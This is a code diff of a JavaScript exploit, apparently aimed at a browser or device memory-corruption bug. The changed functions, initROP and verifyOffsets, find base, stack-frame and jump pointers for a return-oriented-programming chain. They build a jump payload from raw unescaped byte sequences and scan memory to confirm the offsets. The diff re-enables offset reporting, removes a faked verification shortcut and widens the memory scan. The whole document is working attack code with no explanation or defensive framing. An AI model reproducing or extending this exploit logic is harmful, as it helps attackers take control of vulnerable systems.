@@ -31,7 +31,7 @@ function initROP()
 		
 		// ==============================================================================
 		// Find File Pointers
-		//showFoundOffsets(offset_find_base_fp);
+		showFoundOffsets(offset_find_base_fp);
 		if((!base_found)&&(!stackframe_found)&&(!j2_found)&&(!j1_found))
 		{
 			ph = 0x6CFD;
@@ -61,7 +61,7 @@ function initROP()
 		
 		// ==============================================================================
 		// Find Stackframe Pointer
-		//showFoundOffsets(offset_find_stack_frame);
+		showFoundOffsets(offset_find_stack_frame);
 		if((base_found)&&(!stackframe_found)&&(!j2_found)&&(!j1_found))
 		{
 			useCustomStackFrame();// call this to setup all params
@@ -92,7 +92,7 @@ function initROP()
 		
 		// ==============================================================================
 		// Find Jump 2 Pointer
-		//showFoundOffsets(offset_find_jump2);
+		showFoundOffsets(offset_find_jump2);
 		if((base_found)&&(stackframe_found)&&(!j2_found)&&(!j1_found))
 		{
 			jump_2=unescape("\u4141\u0000")+hexw2bin(stack_frame_addr)+unescape("\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950")+hexw2bin(stack_frame_addr)+unescape("\uFB7E");
@@ -120,7 +120,7 @@ function initROP()
 		
 		// ==============================================================================
 		// Find Jump 1 Pointer
-		//showFoundOffsets(offset_find_jump1);
+		showFoundOffsets(offset_find_jump1);
 		if((base_found)&&(stackframe_found)&&(j2_found)&&(!j1_found))
 		{
 			//jump_1=reload_jump1(true);
@@ -220,10 +220,10 @@ function verifyOffsets()
 		showFoundOffsets(offset_find_jump1);
 	}
 	
-	stack_offsets.push(stack_frame_addr);stackframe_verified=true;stack_frame_acolor=colorVerifiedFake;
+	//stack_offsets.push(stack_frame_addr);stackframe_verified=true;stack_frame_acolor=colorVerifiedFake;
 	if(!stackframe_verified)
 	{
-		stk=checkMemory(stack_frame_addr-0x4,0x1000,stack_frame.length,6);
+		stk=checkMemory(stack_frame_addr-0x4,0x10000,stack_frame.length,6);
 		if(stk===stack_frame){stack_offsets.push(stack_frame_addr);stackframe_verified=true;}else{stackframe_verified=false;stackframe_found=false;allOffsetsFound=false;}
 		showFoundOffsets(offset_find_stack_frame);
 	}
